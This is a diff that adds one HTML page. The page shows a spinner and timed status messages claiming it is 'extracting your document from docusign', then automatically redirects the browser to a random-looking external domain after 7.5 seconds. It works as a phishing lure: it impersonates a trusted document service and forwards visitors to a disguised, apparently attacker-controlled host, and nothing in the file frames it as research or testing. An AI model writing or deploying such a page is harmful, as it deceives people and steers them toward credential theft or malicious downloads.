@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading Experience</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0f172a;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      text-align: center;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #ccc;
+      border-top: 5px solid #3b82f6;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+    .status {
+      margin-top: 10px;
+      font-size: 18px;
+      opacity: 0.8;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Please wait...</h2>
+    <div class="spinner"></div>
+    <div class="status" id="status">Initializing...</div>
+  </div>
+
+  <script>
+    const status = document.getElementById("status");
+
+    setTimeout(() => {
+      status.textContent = "Loading...";
+    }, 1500);
+
+    setTimeout(() => {
+      status.textContent = "extracting your document from docusign...";
+    }, 3000);
+
+    setTimeout(() => {
+      status.textContent = "File almost Ready...";
+    }, 4500);
+
+    setTimeout(() => {
+      status.textContent = "get ready to get your files 😊...";
+    }, 6000);
+
+    setTimeout(() => {
+      window.location.href = "https://www.fl3728392933xcvasgdg-637383625353823s.com";
+    }, 7500);
+  </script>
+</body>
+</html>
